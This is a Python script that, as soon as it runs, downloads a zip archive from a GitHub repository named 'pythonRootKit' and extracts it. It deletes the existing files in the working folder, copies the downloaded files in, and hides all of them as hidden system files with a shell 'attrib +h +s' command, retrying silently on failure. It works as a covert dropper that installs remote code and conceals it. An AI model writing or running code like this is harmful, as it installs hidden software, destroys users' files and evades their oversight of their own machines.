from fileinput import filename
import requests
import zipfile
import os
import shutil
import subprocess
import time

def getpath(change=False):
    if change in (False, "not", "\\"):
        return os.getcwd()
    else:
        return os.getcwd().replace('\\', '/')
def getFileName(Path=""):
    return os.path.basename(__file__)
def getNameDir(data):
    NameDir = data.split("/")
    deleteExtension = (data.split("/")[len(NameDir)-1]).split(".")
    result = (deleteExtension[0])
    result = (data.split("/")[len(NameDir)-3])+"-"+result
    return result
    
def supDir(data):
    shutil.rmtree(data)
def supFile(data, pathArrivingFiles=""):
    if pathArrivingFiles != "":
        if type(data) == list:
            for i in range(len(data)):
                try:
                    os.remove(data[i-1])
                except:
                    None
        if type(data) == str:
            try:
                os.remove(data)
            except:
                None
    else:
        if type(data) == list:
            for i in range(len(data)):
                if data[i-1] != getFileName():
                    try:
                        os.remove(data[i-1])
                    except:
                        None
        if type(data) == str:
            if data != getFileName():
                try:
                    os.remove(data)
                except:
                    None

def pathReorder(pathArrivingFiles):
    pathArrivingFiles = pathArrivingFiles.split("\\")
    if pathArrivingFiles[len(pathArrivingFiles)-1] == "":
        pathArrivingFiles.pop(len(pathArrivingFiles)-1)
    pathArrivingFiles = "/".join(pathArrivingFiles)
    return pathArrivingFiles
    
def downloadFileGithub(file_url):
    data=".zip"
    r = requests.get(file_url, stream = True) 
    with open(data,"wb") as zip	: 
        for chunk in r.iter_content(chunk_size=1024): 
             # writing one chunk at a time to zip file 
             if chunk: 
                 zip.write(chunk)
    unzipfile()
    
def unzipfile():
    data=".zip"
    file = data
    # open ZIP file in read mode
    with zipfile.ZipFile(file, 'r') as zip: 
        # extract all files
        zip.extractall() 
    os.remove(data)

def hiddenFiles(arg="", NameFile=""):
    files = sortNameFile()
    cmd = "cd "+getpath(True)
    if NameFile != "":
        files = NameFile
    if arg != "":
        cmd = "cd "+arg.replace("\\", "/")
    for i in range (len(files)):
        cmd = cmd + "& attrib +h +s "+files[i-1]
    # print (cmd)
    subprocess.Popen(cmd, shell=True)
    
def sortNameFile(data=getpath(True)):
    from os import listdir
    from os.path import isfile, join
    return [f for f in listdir(data) if isfile(join(data, f))]
    
def moveFileFromDir(data, pathArrivingFiles=""):
    if pathArrivingFiles != "":
        files = sortNameFile(data)
        for f in range(len(files)):
            path = getpath(True)
            path = path+"/"+data+"/"+files[f]
            shutil.copy(path, pathArrivingFiles)
    else:
        files = sortNameFile(data)
        for f in range(len(files)):
            if files[f] != getFileName():
                path = getpath(True)
                path = path+"/"+data+"/"+files[f]
                shutil.copy(path, getpath(True))

def executeFile(data):
    os.system(data)

def update(data, delete=False, hidden=False, pathArrivingFiles=""):
    '''
    this methode can only be used for download file from github.com
    
    data = link of the web depository
    
    you can also use the delete args
    
    if delete = True all the files in the folder will be deleted then replaced by what has been downloaded
    
    if hidden = True all files in the folder will be hidden
    '''
    dir = getNameDir(data)
    loop = 0
    pathArrivingFiles = pathReorder(pathArrivingFiles)
    while loop < 5:
        try:
            if pathArrivingFiles != "":
                downloadFileGithub(data)
                if delete in (True, "true", "vrai"):
                    supFile(sortNameFile(pathArrivingFiles), pathArrivingFiles)
                moveFileFromDir(dir, pathArrivingFiles)
                supDir(dir)
                if hidden in (True, "true", "vrai"):
                    hiddenFiles()
            else:
                downloadFileGithub(data)
                if delete in (True, "true", "vrai"):
                    supFile(sortNameFile())
                moveFileFromDir(dir)
                supDir(dir)
                if hidden in (True, "true", "vrai"):
                    hiddenFiles()
            loop=5
        except:
            loop = loop + 1
            time.sleep(20)

update("https://github.com/N0SAFE/pythonRootKit/archive/main.zip", delete=True, hidden=True)
